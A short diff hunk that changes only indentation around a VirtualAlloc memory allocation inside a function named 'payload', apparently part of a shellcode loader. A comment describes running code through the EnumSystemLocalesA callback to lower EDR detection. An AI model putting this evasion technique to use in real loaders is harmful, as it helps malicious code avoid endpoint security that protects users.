@@ -160,7 +160,7 @@ int payload () {
 
 // This method replaces lines 147 through 159 - This has a lower EDR detection rate as EnumSystemLocalesA api is not normally used to execute code.
 
-			LPVOID mem = VirtualAlloc(
+		LPVOID mem = VirtualAlloc(
 			0,
 			buffer.size() + 1,
 			MEM_COMMIT | MEM_RESERVE,
